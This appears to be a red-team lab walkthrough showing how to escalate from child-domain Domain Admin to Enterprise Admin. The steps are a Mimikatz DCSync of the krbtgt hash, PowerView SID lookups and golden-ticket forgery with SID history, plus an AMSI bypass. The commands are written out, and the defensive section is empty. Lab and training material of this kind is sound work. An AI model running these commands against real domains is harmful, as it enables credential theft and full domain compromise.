# Krbtgt hash

## Attacking

### How it works

Once you gain Domain Admin privileges within the child domain its possible to get Enterprise Admin in the parent domain by generating a golden ticket in the child domain with the SID of the Enterprise Admin group.

### Tools

* [MimiKatz](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1)

### Executing the attack

The attack is executed from the perspective of already gaining domain admin privileges. This is done in the unconstrained delegation section:

{% content-ref url="../delegation-attacks/unconstrained-delegation/" %}
[unconstrained-delegation](../delegation-attacks/unconstrained-delegation/)
{% endcontent-ref %}

The attack can be performed in two ways, abusing the [trust key](https://github.com/0xJs/RedTeaming\_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#trust-key) or the [krbtgt hash](https://github.com/0xJs/RedTeaming\_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#krbtgt-hash). I prefer the krbtgt hash way so that is what we would do in the attack below.

1. For easy execution, login on `WS01` as the `Administrator` user with the password `Welcome01!`.
2. Start PowerShell as Administrator and load a amsi bypass and MimiKatz into memory.

![](<../../../.gitbook/assets/image (20).png>)

To execute the attack we need a couple bits of information:

* The hash of the krbtgt user.
* The SID of the Enterprise Admins group.
* The SID of the child domain.

3\. Execute a DCsync with MimiKatz and only retrieve the krbtgt hash:

```
Invoke-MimiKatz -Command '"lsadump::dcsync /user:amsterdam\krbtgt /domain:amsterdam.bank.local"'
```

![](<../../../.gitbook/assets/image (22).png>)

4\. Retrieve the SID of the enterprise Admins group, using PowerView:

```
Get-DomainGroup "Enterprise Admins" -Domain bank.local | Select-Object samaccountname, objectsid
```

![](<../../../.gitbook/assets/image (34).png>)

5\. Retrieve the domain SID from the child domain, using PowerView:

```
Get-DomainSID
```

![](<../../../.gitbook/assets/image (21).png>)

6\. Create a golden ticket with MimiKatz and inject it into the current session:

```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /ptt"'
```

![](<../../../.gitbook/assets/image (70).png>)

7\. The ticket injected successfully, now we can dir the c$ directory to check if our user has read/write access to the C disk:

![](<../../../.gitbook/assets/image (75).png>)

## Defending

### Detection



## References

{% embed url="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1" %}
